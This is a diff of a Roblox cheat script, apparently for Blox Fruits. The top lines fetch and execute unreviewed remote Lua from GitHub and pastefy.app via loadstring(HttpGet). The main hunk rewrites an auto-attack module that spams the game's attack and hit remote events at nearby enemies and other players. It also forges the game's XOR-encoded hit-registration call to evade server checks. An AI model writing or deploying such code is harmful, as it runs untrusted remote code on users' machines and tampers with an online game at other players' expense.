@@ -1,30 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DIO862/Gayyyyyyyyyyyyyy/refs/heads/main/notifynew.lua"))()
-local RunService = game:GetService("RunService")
-local fpsGui = Instance.new("ScreenGui", game.CoreGui)
-fpsGui.Name = "FPS_Display_80"
-
-local fpsLabel = Instance.new("TextLabel", fpsGui)
-fpsLabel.Position = UDim2.new(0, 10, 0, 10)
-fpsLabel.Size = UDim2.new(0, 120, 0, 30)
-fpsLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-fpsLabel.BackgroundTransparency = 0.4
-fpsLabel.TextColor3 = Color3.new(1, 1, 1)
-fpsLabel.Font = Enum.Font.Code
-fpsLabel.TextSize = 18
-fpsLabel.Text = "FPS: ..."
-fpsLabel.TextXAlignment = Enum.TextXAlignment.Left
-
-local lastTime = tick()
-local frames = 0
-
-RunService.RenderStepped:Connect(function()
-    frames += 1
-    if tick() - lastTime >= 1 then
-        fpsLabel.Text = "FPS: " .. frames
-        frames = 0
-        lastTime = tick()
-    end
-end)
+loadstring(game:HttpGet("https://pastefy.app/pEpaGDU1/raw"))()
 
 do
   ply = game.Players
@@ -12001,97 +11976,230 @@ task.spawn(function()
     end)
   end)
 end)
-local FastAttack = {
-    Enabled = true,
-    Range = 60,
-    Delay = 0.03, 
-}
+local FastAttackModule = {}
+local HitRegistrationModule = {}
+local MainController = {}
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Workspace = game:GetService("Workspace")
+local GameService = game
+local Players = GameService:GetService("Players")
+local RunService = GameService:GetService("RunService")
+local ReplicatedStorage = GameService:GetService("ReplicatedStorage")
+local Workspace = GameService:GetService("Workspace")
 
 local LocalPlayer = Players.LocalPlayer
-local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
-local RegisterAttack = Net:WaitForChild("RE/RegisterAttack")
-local RegisterHit = Net:WaitForChild("RE/RegisterHit")
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 
-local Enemies = Workspace:WaitForChild("Enemies")
-local Characters = Workspace:WaitForChild("Characters")
-
-local lastHit = 0
-local cached = {}
-local lastCache = 0
-
-local function IsAlive(model)
-    local hum = model and model:FindFirstChildOfClass("Humanoid")
-    return hum and hum.Health > 0
+local function SafeWaitForChild(parent, childName)
+    local success, result = pcall(function()
+        return parent:WaitForChild(childName)
+    end)
+    return result
 end
 
-local function GetTargets(char)
-    local now = tick()
-    if now - lastCache < 0.12 and #cached > 0 then
-        return cached
+local Enemies = SafeWaitForChild(Workspace, "Enemies")
+local Characters = SafeWaitForChild(Workspace, "Characters")
+local Modules = SafeWaitForChild(ReplicatedStorage, "Modules")
+local Net = SafeWaitForChild(Modules, "Net")
+
+FastAttackModule.Rate = 0.000000002
+FastAttackModule.Enabled = true
+
+function FastAttackModule.IsAlive(target)
+    local humanoid = target:FindFirstChild("Humanoid")
+    if humanoid and humanoid.Health > 0 then
+        return true
     end
-    lastCache = now
-    cached = {}
+    return false
+end
 
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if not root then return cached end
-    local pos = root.Position
+function FastAttackModule.GetNearbyTargets(character, folder)
+    local characterPosition = character:GetPivot().Position
+    local nearbyTargets = {}
+    local children = folder:GetChildren()
+    
+    for i = 1, #children do
+        local target = children[i]
+        local humanoid = target:FindFirstChild("Humanoid")
+        local rootPart = target:FindFirstChild("HumanoidRootPart")
+        
+        if humanoid and rootPart and humanoid.Health > 0 then
+            local distance = (rootPart.Position - characterPosition).Magnitude
+            if distance <= 60 then
+                table.insert(nearbyTargets, target)
+            end
+        end
+    end
+    return nearbyTargets
+end
 
-    local function scan(folder)
-        for _, v in ipairs(folder:GetChildren()) do
-            if IsAlive(v) then
-                local hrp = v:FindFirstChild("HumanoidRootPart")
-                if hrp and (hrp.Position - pos).Magnitude <= FastAttack.Range then
-                    local head = v:FindFirstChild("Head") or hrp
-                    table.insert(cached, {v, head})
+function FastAttackModule.GetTargetParts(targetList)
+    local result = {}
+    local count = #targetList
+    
+    for i = 1, count do
+        local target = targetList[i]
+        local head = target:FindFirstChild("Head") or target.PrimaryPart
+        if head then
+            table.insert(result, {target, head})
+        end
+    end
+    return result
+end
+
+function FastAttackModule.GetAllTargets(character)
+    local enemies = FastAttackModule.GetNearbyTargets(character, Enemies)
+    local otherCharacters = FastAttackModule.GetNearbyTargets(character, Characters)
+    
+    local allTargets = {}
+    for i = 1, #enemies do
+        table.insert(allTargets, enemies[i])
+    end
+    for i = 1, #otherCharacters do
+        table.insert(allTargets, otherCharacters[i])
+    end
+    return allTargets
+end
+
+function FastAttackModule.ExecuteFastAttack()
+    local character = LocalPlayer.Character
+    if not character then return end
+    
+    local tool = character:FindFirstChildOfClass("Tool")
+    if not tool then return end
+    
+    local targets = FastAttackModule.GetAllTargets(character)
+    if #targets < 1 then return end
+    
+    local targetParts = FastAttackModule.GetTargetParts(targets)
+    if #targetParts < 1 then return end
+    
+    local attackRemote = Net["RE/RegisterAttack"]
+    local hitRemote = Net["RE/RegisterHit"]
+    
+    attackRemote:FireServer(FastAttackModule.Rate)
+    local targetHead = targetParts[1][2]
+    hitRemote:FireServer(targetHead, targetParts)
+end
+
+local AttackRemoteTarget
+local AttackRemoteId
+
+local function InitializeHitRegistration()
+    local foldersToCheck = {
+        ReplicatedStorage.Util,
+        ReplicatedStorage.Common,
+        ReplicatedStorage.Remotes,
+        ReplicatedStorage.Assets,
+        ReplicatedStorage.FX
+    }
+
+    for _, folder in ipairs(foldersToCheck) do
+        local children = folder:GetChildren()
+        
+        for _, child in ipairs(children) do
+            if child:IsA("RemoteEvent") and child:GetAttribute("Id") then
+                AttackRemoteTarget = child
+                AttackRemoteId = child:GetAttribute("Id")
+            end
+        end
+
+        folder.ChildAdded:Connect(function(child)
+            if child:IsA("RemoteEvent") and child:GetAttribute("Id") then
+                AttackRemoteTarget = child
+                AttackRemoteId = child:GetAttribute("Id")
+            end
+        end)
+    end
+end
+
+InitializeHitRegistration()
+
+function HitRegistrationModule.Execute()
+    local character = LocalPlayer.Character
+    if not character then return end
+    
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return end
+    
+    local hitTargets = {}
+
+    local function ScanFolder(folder)
+        local children = folder:GetChildren()
+        for i = 1, #children do
+            local target = children[i]
+            local humanoid = target:FindFirstChild("Humanoid")
+            local rootPart = target:FindFirstChild("HumanoidRootPart")
+            
+            if humanoid and rootPart and humanoid.Health > 0 and target ~= character then
+                local distance = (rootPart.Position - humanoidRootPart.Position).Magnitude
+                if distance <= 60 then
+                    local targetChildren = target:GetChildren()
+                    for _, child in ipairs(targetChildren) do
+                        if child:IsA("BasePart") then
+                            table.insert(hitTargets, {target, child})
+                        end
+                    end
                 end
             end
         end
     end
 
-    scan(Enemies)
-    scan(Characters)
-    return cached
+    ScanFolder(Enemies)
+    ScanFolder(Characters)
+
+    local tool = character:FindFirstChildOfClass("Tool")
+    
+    if #hitTargets > 0 and tool and (tool:GetAttribute("WeaponType") == "Melee" or tool:GetAttribute("WeaponType") == "Sword") then
+        local seed = Modules.Net.seed:InvokeServer()
+        
+        local attackRemote = Net["RE/RegisterAttack"]
+        local hitRemote = Net["RE/RegisterHit"]
+        
+        attackRemote:FireServer()
+        
+        local targetHead = hitTargets[1][1]:FindFirstChild("Head")
+        if not targetHead then return end
+
+        hitRemote:FireServer(targetHead, hitTargets, {})
+        
+        if AttackRemoteTarget then
+            local remoteCode = "RE/RegisterHit"
+            local encryptionKey = math.floor(Workspace:GetServerTimeNow() / 10 % 10) + 1
+            
+            local encodedString = string.gsub(remoteCode, ".", function(char)
+                return string.char(bit32.bxor(string.byte(char), encryptionKey))
+            end)
+
+            local finalId = bit32.bxor(AttackRemoteId + 909090, seed * 2)
+            
+            cloneref(AttackRemoteTarget):FireServer(
+                encodedString,
+                finalId,
+                targetHead,
+                hitTargets
+            )
+        end
+    end
 end
 
-local function Attack()
-    if not FastAttack.Enabled then return end
+local function DisableCameraShake()
+    local cameraModule = require(ReplicatedStorage.Util.CameraShaker)
+    cameraModule:Stop()
+end
 
-    local char = LocalPlayer.Character
-    if not char then return end
+local function StartMainLoops()
+    task.spawn(function()
+        while task.wait(FastAttackModule.Rate) do
+            FastAttackModule.ExecuteFastAttack()
+        end
+    end)
 
-    local tool = char:FindFirstChildOfClass("Tool")
-    if not tool then return end
-
-    local tip = tool.ToolTip or tool:GetAttribute("WeaponType")
-    if tip ~= "Melee" and tip ~= "Sword" and tip ~= "Blox Fruit" then return end
-
-    local now = tick()
-    if now - lastHit < FastAttack.Delay then return end
-    lastHit = now
-
-    local targets = GetTargets(char)
-    if #targets == 0 then return end
-
-    pcall(function()
-        RegisterAttack:FireServer(0.0001)
-        RegisterHit:FireServer(targets[1][2], targets)
+    RunService.Heartbeat:Connect(function()
+        pcall(HitRegistrationModule.Execute)
     end)
 end
 
--- Chỉ 1 connection
-RunService.Heartbeat:Connect(function()
-    pcall(Attack)
-end)
-
--- Tắt rung camera
-pcall(function()
-    require(ReplicatedStorage.Util.CameraShaker):Stop()
-end)
+StartMainLoops()
 
 local function getBeastHunter()
     local character = LocalPlayer.Character
